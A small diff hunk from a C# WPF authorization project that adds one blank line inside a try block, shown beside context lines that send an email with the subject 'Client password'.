@@ -33,6 +33,7 @@ namespace WPFAuthorization
                 message.Subject = "Client password";
                 mySmtpClient.Send(message);
                 stringBuilder.Clear();
+
             }
             catch (SmtpException ex)
             {
